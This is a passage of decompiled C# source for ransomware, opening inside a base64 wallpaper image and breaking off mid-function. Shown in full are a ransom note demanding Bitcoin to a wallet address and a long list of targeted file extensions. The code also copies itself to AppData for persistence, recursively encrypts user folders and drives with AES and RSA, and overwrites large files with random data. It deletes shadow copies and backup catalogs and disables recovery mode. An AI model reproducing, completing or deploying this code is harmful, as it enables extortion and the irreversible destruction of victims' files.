Wx9/zC6i9IvSaz8lJ1ZjkYvkxzV83PiR25GKceWay4w6ETt469e20xKUx3T62nHjtkv2xHlrcPixjrM3ruZa3vFVnjca+e3j0yO60T7ki9o89y7zOHNLTaseFGY1LNZi0I8uPJitqWlwuXa1u2/lpf+GNwKT9aJ+GyqZoiJ8PQdNve+P8AIZfUserd0R7X88Xmsdk/2q9SmZw02YvEnP8Ayx2iY9MqszE+GrweXE17LMmfb1W01ncLV6xaHB4/IthvuH0fjR/bM4/UJjVb+WjS8XrFonalfHNXp8HKpmj8ZeclJtNdfDpEeID9NNrHbETs/wDjTzktFaWm0/D1MxHmWby+dW1Zx1j/AFvSkzKtys9MVPM+Wdknd5n9vJM7lDoR4eRnzO0xPl1rnvFe2JnTkMa2zFpr6TMzPtAmImfUMseZQnUy74eJkyz4hfwdPrWfvnf6aWyRC1h4eTL6hmUw3vMRESvYOnTP3ZJ00aUrSNViIhF8tMcTE2/xXtmm3irq4un48X5ZJeaYMWPzFY2jLyceKvm0TP4ZvK5t7zNazqFSZmfctoxb82RZeoVp+OKGjl6n7ikaUMma17btLn/onrSKuZm5OXL+0gDZXQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmJ8gDW6bmm1eyZ/p66lWbYomPUM3j5pxZImGvntF+HMx8+la1e2+3cwZoy8acc+4YUoer/AMpeVlxJ9gAw9V/lDe4n/T1YNf5Q3eH/ANNVXz+nW6XOsku4bj0fpU09HMn4342f4y+byLRm7YnxV34fM+p9t58/CWcUxG1CvOpbJ2Lv6eclIvWazD1/Qi35XpiLRphcnDbDl8w0On54vj7J9x6e+dhnLjjtjzX2ysOScOWNT8rcf6lXn53w+R/Ut8mNxqfTzjvF6RMPSpqYl6CJi9dsjn8bsvM0jwrYsVslojtlv2pF41aNwitK1jxWIhYjPqNS5OTpkWyd0T4c8PHx4qxqv3PPL4/1qa+YWCfSLvne3Qnj0+Ps0+btHbaY/CFznYfp5Z0pr1Z3G3kstJx3mstTpmXe6zPn4aLA4uWcWWJhu47RekWj5Vc1dTt6DpmeL4+yfpx5uH6mKZj3Cjw+TOPJ2WnVWtMbifhhcrH9LNMQzi1aO2UXPi2G8ZatyJiYiYnwn/yy+FzO3VLz9rUiYnUx6RXp2S6HG5Nc9dwAI1r+mb1PH5izNiPOm9ycX1cVo+YYV4mt5iV7DbdXmOo4ezL3fy1OBxa9sZJncr7N6bnrH2Wn+l7Lk+nXetwgyxM2dXhXx1w7h7mIncTHiVHL0/d+6sreLLGWu49ukw0i008LF8OPkViZcsGGuGuo9uvwHy0m0z7T0pFI1EHwzOqWnuivw05nUb+IYvPzRlyzr1CbBHlz+p5Iri7f5VJNAuvMELPG5lsHyrG2JiJ9pMeS2O3dWWxTqOOZjcPE9SrvxDKiRHGGq7PUc2va9yedbJHbXxCjvz5T7QkrXt9KeXNbLO7SaCHumO+SdRA0rWZ8Q8Jilp9Qv4en3tP3+IX8XHx4o8V3P5R2yxVfwdPyZPNvEMvBwb5PMxqGhi4WPHHmNz+XbLlphr5iP6VMnUqxXVYQza9/ToVxcbjR+U7ld+2kfERDjk5eKkbi3lk5uTfJO9y490/ltXB/2QZeqfWOGjm6jMxqkaUL5bXncy8zKE9aVr6c3NycmWfyk2RCEtlcEAJEJBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAhq9Pyxek47T/TKWOJl+nmiZaXjcLXFy/Hke+XxrY7zMR4VX0GWvfhmIiJiYYGSJraYa4793hNzePGK0Wj1LygSlc9NfcN3h+ePRgw1+m5N07Zn0gzxurp9MtrNpeAU3p58wxOf/AM+0q9bTWdwu9TrEZNwoOhTzV4/k1mmWYbPA5P1a9tp+6PS4+fwZZxXiy7k6jNo1Xwgvi3Ph1eL1CK49X9tK01190xphcntjPM09Gfk3y23MuO/ykx4+1R5vMjPOoj01enZu6OyZX/6YXEyfTzRLdrO4jXygzU1O3W6bm+TH2z9ACB1A+SZiImZlwvysdKz58torMor5a0j8pceoYe7H3x8MiY00OVzvqUmsR4lnTO5XcUTFdS8xzr0vk3UiWp0/POopafHwy3bj5JxZa2htevdVDxc3xZIlv/DN6nimZi8R4aFLxekWr6lGbHGTHNZ/xSpPbZ6Xk44z4tQ+e3MS0+n8ncdlp/pn5qTTJMSilppMTC7esXq83gzWwZNvoj50rcTlVzU1M/csz+1C1Zr4l6vFkrlrFqySyeo4O2/dEeJa0OPJxfVxTHzHpvjv2yr83D8uOf5YVZms735anC5Pf9mSfPwy7R22mJgraYncLlqxaHm8OecNm/ixVpMzV0/+GVg6jNP5/cu4+ZivEbnU/hUvjtt6Hj8vDasRE6WD/wCHi+bHjiJtaFTL1GtZntjbSMcysZOVix+5deXyYwUmP+6WJae6Zn8uvIz2zW7pcl3HTth5rmcj577+kAJFIAAExEzPh3w8TJlnxDEzEJKY7Xn8YcYj9bdsPEyZZ1ENDj8GmON3+6Vq1qY6bmYiIQWy/UOph6d47ss6UcXTYj+c+V3Hix4Y8REKubqNK7ikbn8qObl3yz/JrFb39ppz8bj/AO3G5auXlY8e/u3+lHN1GbeKR2qM2tPuXlLXFEe1LN1DJk8V8Q65M98k7tbblPk2JIhQtabexAMtQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABKEgETqdgM7bPAz/AFMU1n3Cp1LF25O78ufByRTNG58SvdRpNsUTEb0r/pf/ANdeLfPxfPuGMkn2LDji/wBMvEZYiflQdMVprkiYa3jcJ+Pk+PJFn0J/bzjtF8cTD050w9lWdxEqXUqxOKJ/DHn23Odj78Npj4YtvEyu4Z/F5nqdZjLt5A2m+3MAGf7ExOpbHT8/1MXbPuvpjLPEz/TywiyV7oXOHm+LJE7bhKIncRKVD1L1sTuNs/qOe9Y7YnxLMm0z8tXqOPup3RHpk+twvYdaeX6h3Rlnco2HtMVmfUJXO0gifLpGK8xvtlz8x4Y9tprNfMtjp2WbY5rv16XfhhcPNOLLDdj1E/lSzV7Z29L07NGTH2/cMnqOGa374+VFu8rD9amo9wxMuOaX1aFnFfxpyuoceceTuj1JiyWx2i0S2eJyoz1iJnVmHL3jyTS8TEs3pF4Q8Xl2wW/p9BuYtqfX5TuLR4nbhxuTTLHjx+nfdYje4jXwpzExOpempkrevdE+GPz8P08u4jxKp68NPn5cOTHqJ+6GX8ruOfHl5jmVrGWe30nREzCBuq/+PU2mfcy8zMgeCZJA1MjGv4Ew90w3vOoiVzD0606m86hrN619rGLj5Mk/jCjFbTPiFnDwsmWNzGoaePi48cRMRuYORya4J/aGcsz+rpU6fTH+eaXLj8GlI3fzKzfJjxV8zFdfCjk6hvH9s6so5c98s7tbbWMdr/s3ty8OCNYoXcvUtTqkaUsue+SdzMuSE9cdauXl5WTLP5SSA3VwEDCUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD1SdWifw3MN68jj6n3phNPpeTW6/lDlruNuj0++r9n1KlyMc48kw4tLqeLUxaPlmt6TuNq/KxfFkmoms+UDf2rxOm3wMsXwdvzC1+2LwM/wBPJG/UtqPMRKjmrqXqen5oyY9fcItG4nfyw+ZhnFlmG7Kh1LD3V74Zw21OmnUsHfj7o+mSh60hdeYExEy94cf1bxXettfDwceOPu8y0vk7YXOPxL55/H0xvp3/APbJETW0bjT6Ltr43WGV1KkVy+I8NK5e6dLHI6fOCvfva7ws05MXn/tWWT07L237ZnxLW/cK2WvbZ2ODm+TFG/bxmp9THNfywcuOa3mNPoZcL8Wl8ndP+tsWTtRc7ifPqa+2Tg49sl4jXj8tbFxMeLXjcx8utKVpXVa609f0xfLNmeNwKYv28yia114iGPz8MY8nj1LYt6nSjkr/APUce0a81bYpmGnUMdbV7ax5ZdZ1MS2uFm+ph1PuGJMatpd6dkimXtmfafLXuq5XBzTiyan01/DO6li3EX+Vyk3jLO58OXOy4/oWrMxNvhXpExZ2eVamTDO2JPtCZ9i68u948lsc7iXvLyb5Z3My4n9MabRkvEdsSTMz7kBlr/6A9Vpa06iNhEb9PKYrMz4hdw9Ptad38L2Hh48Xn+SK2WI9L2HgZMnmfEM3DwsmXXjxK7i6fSuptO5/C3a9KV3MxFYU8vUa0tMU8whm97+nQjj8bBH5zuVylKUr4iIV8nNpS+pjbNzcrJknzZxmZ35lvXDv9kGTqWvGKNNXJ1Gtd9kbZ2fPbNbcy4iWuOK+lHNy8mXxaQEN1UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO/DtgyzjyRMOMJjwxMbb0tNJ3Ddz465+Pv514Yd47bS1un5vqY+yfcKXPw/Ty7j1KDHOrTV1ObWMuOuWFQBYchNZ1aJbvEyd+GPPlgtHpuWIt22n2hzV3V0unZvjya/lqfp5vWuSvbZ6j14FL15emtEXjTF5nH+jk18Kjb5uGcuOO2NzDHyY7UtMWjWl7Hfuh5bm8f4snj0jHOrxL6DDf6mKtnz9I3eG/wAek0xVrKPP6W+k77p/h0U+oYpvh7vwuOHL8ce0IMc6s6/LiLYpiWJW3beNflvYMkZMVZh8/b+UtLpmSdzWVnNXdduH07N2Ze3+WkApvSwf0Hw82vWkbtJG2JmK+ZeniMdaRatY9oyZa48U33DPnqV9pKUtKlyOVipP5KvLx/TzTDjEzE7iXXPmnNfvlxXq+nmMkx3zNfSzbmZZr2zZwtebT5nbzsgiIa2yWtHmUJQlloCe2XfBxb5Z9MTMQkpjtedRDhEb+HXHx75PEQ0sPT6U1NvKzH08NZiZiNIbZv8Aq6WLp0+8k6Z2LptpmJv4hfxcfHhrvURMfLnm52KkR2zuWfn518vjeoaavf2sd/G436+ZaGXm46R48yo5efkt/GdQpzbaNpa4qwoZedlyeInT1bJa0+Zl5QJVGZmfaQBggAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJQkFzg54x5I36le5+KcmGJiPTHpOrRLew2+rgjfmZhXyR227nY4U/LjtiswJjU6Q7cjHOPLMS4p4nblXr2zqSE1tMWiYl5TA1iW5ws31McRPuFn4YnD5E4Lxv02qXresWr8qWWnbO3qOByYyU7Z9wn48K3K4tc1dxH3LP7EdZ15XMuKuSO2YY8cLJTJH2/LYr4rHjzo0TqG18ncg4/FrgmdfY4czzxrO7jy/+nsxT9knJ84phgz7l14+WceWJhzt/JETqXQmNw8hW00vuH0eO0XpW0epSpdP5EWxdkzrT1yebXFutfKjOOe56nHy6fFF7StzOo8srqOTeT7bbcs/NvkjUTqFWbTPtPjxTXzLl8znxljsq9TlvMamZeAWHIm0z7EJIiZGPYQ74uNkv5iqzi6fa07v4aTeI9rGPjZcn6wo1pNvULeLgZLa3GoaWLj0w19R/ab58WP3bX6Q2zTPirp4+n0pHdllzxcPHjiO7zLrfJjxR5mIhQzdRmYmKeFG+W17btJGO1v2bZOZiw+MUL+fqPuKeIUL5r3nc2l4QnrSKuVl5OTLPmTcyA2QSgAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASACYnUtPpmTe6MtY4mb6OWJaZK91VviZfjyRM+lvqeKfF2Z8t/LFc/Ht2/MMK8atMfhrhtuNJ+o4+2/fHqXlCUJXNSv8HlRjntv6UExMtbVi0aTYctsVu6H0Vbxem6zuJ9Odc09/bNWZw+VbDbUzuJ9telq3rFq61KpfH2vR8fk/PETE6l6+ETEWjyn9wShdD/0+FXn5IphmP8A3LMzqsyx+ZypzT2/hLipNrKHPz1pimu/MqcyQSLzyyYmY9STMz7lCZ8hvwggTETPqAiER7TEbl3wcTJlnxGl/j8CuOd38z+EdskQtYeHkyTvXhnY+PfJOorLQ4/T61+687/S5a2PHXfiFLk9QiNxjn/UPfa/p0v8fBxvN53K9NqY6+dREON+XirXcW3r4Y981rzuZmXPumfltGH7lDfqc+qwu8nm3yeKzqqnN7TPmXmSE0ViHNyZr5J3MmwkbeEYAMAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJE6lCQbHT80ZMXZPwpc/D9PLOvSen5O3LEfld6hh76d0e4V/1u7P/AOji/wBwxhMxqdIWHG1pCUAJ9O+HkXxzuJcBiY23pkmk7hp06lr+VdmTqe/410zBp8VVv/6GfWtrGTl5bxqbeFfYN4jXpUve153aUoPLpTFe86iGdx9sRWbeIc4h6ilpnxG1/B06Zjd50vYsGLFG9Rv8obZYj0v4en3v5t4Z2HgXvaIv9sL+HiY8XnUePlzz86lI1We6VHPzb5PG9Q01a/tai3G4/rzLUy8jFhj3G/xDPzdQtafs+2FGbTPuUN64ohVzc++TxXxDpfLe07m0uczuQSxCha0z7QAy1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeqTq0THw2+LnjPTVvcMRa6faYzQiyV3C9ws0479v1Kedx5xZJmPUqfpv8nF9XFMa8/DBvGrzBit3Q252D4r7j7eRKErngAJgl6ik29Qs4eDkyeZjwxNqx7S48V7zqsKsV2sYeJkyz4q0cXBx4/M+f0sWyY8UeZiEFsv/V08XTteck6VcPT6VmO/z+liK4sET6qq5+oRXcUj/Wfl5F8k7mzWKXv7S35GDj/7cblp5ufSkarG5/LOz8vJln34cJttCauOKudn5mTL9+CZmRCUinO5ABlAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn268fJOPLFnIhiY34bVtNbbh9HS9clIms7iYY/OwRizTr1K10zJuJp8vfUOPN8ffE+YVq/hfTvZ4/wAnjRkj3DHNSsYeJky28VXsHT4rO7+U9slauVh4eTL6hm0xXvPiJXcXTrTqbzqGjWuPHGoiIhVz9QrSZikeUPyWt+roRw8GCO7LO3fFxsWKInUbj5eM3LxYo1E7lm5OZkvExvxKva0zO9sxi3+yPJz608Yo0uZeoZLeInSrfLe07mdvCE0Vivpz8me9/NpJnaAbIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgewWOHmnFliYbkTE1ifcPnInWpXcfULY8fagyY+6dw6vB5kYomt/TWma1je4iFDlc/X241DLyL5J3NpcpmZ9lMOvbPI6jNo7aeHu+fJafNpeJmZ+UCbUR6cu1pn3IAy1QkQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/9k=";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "README.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[12]
	{
		"All of your files have been encrypted and this PC has been censored..", "", "Your computer has been infected with a ransomware virus that has encrypted all your files and you won't be able to decrypt them without help.", "", "You need the special decryption software, this software will allow you to recover all of your data and remove the ransomware from your computer. ", "", "The price for the software is £200, payment can be made in Bitcoin only..", "", "Amount to pay in BTC - 0.0093", "",
		"Bitcoin Address: 18EWb7Z2aGaYG4Z4mvX1CboqFtYBC5r4GT", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>0VMnVBLIKBRx+RnauDajnuGNViuB50bTRzNHj9E0iCVgKEJw651SOZY3CHdWDTCkV2zoPIDFuktsrFhYu6EkW0TiQaRhP7bkX2Qtee3e5wFL+Nqnc5CjGr38+qauaIiDeRjvYNO9b7nIfTas32O/QNpAdap3QBqHWEbi8XlQVhU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
